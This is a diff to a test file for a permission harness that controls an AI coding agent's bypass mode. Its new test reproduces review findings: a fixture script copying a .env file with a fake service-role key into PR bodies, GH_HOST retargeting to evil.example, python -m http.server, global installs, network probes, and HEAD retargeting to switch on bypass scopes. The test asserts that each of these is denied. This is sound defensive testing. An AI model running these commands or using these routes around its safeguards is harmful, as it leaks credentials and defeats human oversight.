@@ -26,18 +26,21 @@ const clone = (x) => JSON.parse(JSON.stringify(x))
 const PINS = { 'scripts/developer-harness-v3/bin/dh3.mjs': 'a'.repeat(64), 'scripts/developer-harness-v3/runtime/vm.mjs': 'b'.repeat(64) }
 function testScopes({ pins = PINS, mutate } = {}) {
   const doc = JSON.parse(SCOPES_DOC)
-  doc.scopes = [{ id: 'scope-test', branch: 'feat/scope-test', writable_protected_paths: ['scripts/developer-harness-v3/**'], excluded_paths: ['scripts/developer-harness-v3/authority/**'],
-    trusted_executions: [{ id: 'cli', entrypoint: 'scripts/developer-harness-v3/bin/dh3.mjs', interpreter: 'node', subcommands: ['status', 'start', 'stop'],
+  doc.scopes = [{ id: 'scope-test', branch: 'feat/scope-test', worktree: ROOT, writable_protected_paths: ['scripts/developer-harness-v3/**'], excluded_paths: ['scripts/developer-harness-v3/authority/**'],
+    trusted_executions: [{ id: 'cli', entrypoint: 'scripts/developer-harness-v3/bin/dh3.mjs', interpreter: 'node', subcommands: ['status', 'start', 'stop'], options: ['--wait-minutes', '--id'],
       closure: { include: ['scripts/developer-harness-v3/'], exclude: ['scripts/developer-harness-v3/tests/'] }, digests: { ...pins } }] }]
   mutate?.(doc)
   return validateBypassScopes(doc, CONTRACT)
 }
 
-const SCRIPTS = { [`${ROOT}/tools/build.mjs`.toLowerCase()]: 'console.log("build")\n', [`${ROOT}/tools/evil.mjs`.toLowerCase()]: "require('fs').writeFileSync('.claude/settings.local.json', '{}')\n" }
+const SCRIPTS = { [`${ROOT}/tools/build.mjs`.toLowerCase()]: 'console.log("build")\n', [`${ROOT}/tools/evil.mjs`.toLowerCase()]: "require('fs').writeFileSync('.claude/settings.local.json', '{}')\n",
+  [`${ROOT}/tools/leak.mjs`.toLowerCase()]: "import { readFileSync, writeFileSync } from 'node:fs'\nwriteFileSync('notes.txt', readFileSync('apps/api/.env'))\n",
+  [`${ROOT}/notes.txt`.toLowerCase()]: 'SUPABASE_URL=https://x.supabase.co\nSUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic2VydmljZV9yb2xlIn0.abc\n',
+  [`${ROOT}/pr-body.md`.toLowerCase()]: '## Summary\nAdds the transition. Mentions .env handling in prose only.\n' }
 function ctx({ branch = BRANCH, scopes = REAL_SCOPES, git, digests = PINS, contract = CONTRACT } = {}) {
   const g = git ?? { branch, upstreamBranch: branch, hasUpstream: true }
   return {
-    contract, projectRoot: ROOT, homeDir: 'C:/Users/dev', tempRoots: ['C:/Users/dev/AppData/Local/Temp'], platform: 'win32',
+    contract, projectRoot: ROOT, projectRootReal: ROOT, homeDir: 'C:/Users/dev', tempRoots: ['C:/Users/dev/AppData/Local/Temp'], platform: 'win32',
     pathExists: (p) => EXISTING_FILES.has(String(p).toLowerCase()),
     readPackageScripts: (dir) => Object.entries(PACKAGE_SCRIPTS).find(([k]) => k.toLowerCase() === String(dir).split('\\').join('/').replace(/\/$/, '').toLowerCase())?.[1] ?? null,
     resolveWorkspace: () => null, gitState: () => g, projectGitState: g, bypassScopes: scopes,
@@ -171,7 +174,8 @@ test('D3.3: scoped edits and pinned dh3 operations proceed only on the scope bra
   ok(write('scripts/developer-harness-v3/tests/d33.test.mjs', on()), 'regression test edit')
   ok(write('docs/developer-harness-v3/18-notes.md', on()), 'V3 docs edit')
   for (const c of ['node scripts/developer-harness-v3/bin/dh3.mjs status', 'node scripts/developer-harness-v3/bin/dh3.mjs start --wait-minutes 45',
-    'node scripts/developer-harness-v3/bin/dh3.mjs stop --root C:\\Users\\dev\\AppData\\Local\\PatelRep\\dh3-smoke']) ok(bash(c, on()), c)
+    'node scripts/developer-harness-v3/bin/dh3.mjs stop --id w1']) ok(bash(c, on()), c)
+  denied(bash('node scripts/developer-harness-v3/bin/dh3.mjs status --root C:/Users/dev/AppData/Local/Temp/x/PatelRep/dh3', on()), '--root to an agent-writable runtime', 'bypass.entrypoint_option')
   // not the pinned code
   denied(bash('node scripts/developer-harness-v3/bin/dh3.mjs status', on({ digests: { ...PINS, 'scripts/developer-harness-v3/runtime/vm.mjs': 'c'.repeat(64) } })), 'modified privileged file', 'bypass.pin_mismatch')
   denied(bash('node scripts/developer-harness-v3/bin/dh3.mjs status', on({ digests: { ...PINS, 'scripts/developer-harness-v3/runtime/new.mjs': 'd'.repeat(64) } })), 'added privileged file', 'bypass.pin_mismatch')
@@ -322,4 +326,41 @@ test('the ceiling is closed: every entry maps to a declared, non-forbidden actio
     'run_local_docker_or_database_stack', 'author_new_forward_only_migration', 'mark_pull_request_ready_for_review', 'modify_pull_request_state']) {
     assert.ok(!(never in CEILING), `${never} is never bypass-authorized`)
   }
+})
+
+test('independent review reproductions (2026-11-24) stay closed', () => {
+  const S = testScopes()
+  const on = (extra = {}) => ctx({ branch: 'feat/scope-test', scopes: S, ...extra })
+  // #1 scope activation from another worktree / by retargeting HEAD
+  assert.equal(bash('git symbolic-ref HEAD refs/heads/feat/scope-test', ctx(), 'default').decision, 'ask', 'symbolic-ref write is not a read in any mode')
+  denied(bash('git symbolic-ref HEAD refs/heads/feat/scope-test'), 'symbolic-ref write in bypass')
+  ok(bash('git symbolic-ref HEAD'), 'symbolic-ref read')
+  for (const c of ['git checkout -b feat/scope-test origin/main', 'git switch -c FEAT/SCOPE-TEST']) denied(bash(c, ctx({ scopes: S })), c, 'bypass.scope_branch_name')
+  denied(bash(`git checkout -b ${D33}`), 'taking the shipped D3.3 branch name', 'bypass.scope_branch_name')
+  denied(write('scripts/developer-harness-v3/runtime/vm.mjs', { ...on(), projectRootReal: 'C:/work/PatelRep-other' }), 'scope branch in another worktree', 'bypass.no_active_scope')
+  denied(bash('node scripts/developer-harness-v3/bin/dh3.mjs status', { ...on(), projectRootReal: 'C:/work/PatelRep-other' }), 'pinned dh3 in another worktree', 'bypass.no_active_scope')
+  // #2 credentials published through a script + PR body
+  denied(bash('node tools/leak.mjs'), 'script copying a credential file', 'bypass.script_forbidden_signature')
+  denied(bash('gh pr comment --body-file notes.txt'), 'PR body file with a service-role key', 'bypass.pr_body_secret')
+  denied(bash('gh pr comment --body "key sk_live_abcdefgh12345678"'), 'inline PR body with a Stripe key', 'bypass.pr_body_secret')
+  denied(bash('gh pr edit --body-file missing.mjs'), 'unreadable body file', 'bypass.pr_body_unreadable')
+  ok(bash('gh pr edit --body-file pr-body.md'), 'ordinary PR body mentioning .env in prose')
+  // #3 environment retargeting gh
+  for (const c of ['GH_REPO=other/repo gh pr create --draft --title t --body b', 'GH_HOST=evil.example gh pr comment --body x', 'env GH_REPO=o/r gh pr edit --body x']) denied(bash(c), c)
+  // #4 python -m
+  for (const c of ['python -m zipfile -e /tmp/p.zip .', 'python -m http.server', 'python -m runpy x']) denied(bash(c), c)
+  ok(bash('python -m coverage report'), 'allow-listed module')
+  // #5 installs that write outside the worktree
+  for (const c of ['npm install --prefix C:/Users/dev evil', 'npm install --prefix=C:/x evil', 'npm i -C ../other x', 'pip install --user evil', 'pip install --target /tmp/x evil',
+    'pip install --prefix /opt x', 'pnpm add -g x', 'pnpm add --dir ../other x', 'yarn add --cwd ../other x', 'npm install --location=user x']) denied(bash(c), c, 'bypass.install_global')
+  // #6 privileged code must run in the foreground, from the worktree
+  denied(evaluateToolEvent(ev('Bash', { command: 'node scripts/developer-harness-v3/bin/dh3.mjs status', run_in_background: true }), on()), 'background privileged run', 'bypass.privileged_background')
+  denied(evaluateToolEvent(ev('Monitor', { command: 'node scripts/developer-harness-v3/bin/dh3.mjs monitor' }), on()), 'privileged run under Monitor', 'bypass.privileged_background')
+  denied(evaluateToolEvent(ev('Bash', { command: `node ${ROOT}/scripts/developer-harness-v3/bin/dh3.mjs status` }, 'bypassPermissions', { cwd: 'C:/Windows/Temp' }), on()), 'privileged run from another cwd', 'bypass.privileged_cwd')
+  // #7 network probes and unparsed interpreters
+  for (const c of ['nslookup abc.example.com', 'ping -n 1 example.com', 'perl -e "print 1"', 'ruby -e "puts 1"', 'cscript x.vbs', 'mshta x.hta', 'Resolve-DnsName example.com']) {
+    denied(evaluateToolEvent(ev(/^[A-Z]/.test(c) ? 'PowerShell' : 'Bash', { command: c }), ctx()), c)
+  }
+  // #11 routine mobile work proceeds
+  for (const c of ['npx expo export --platform web', 'npx expo prebuild --no-install']) ok(bash(c), c)
 })
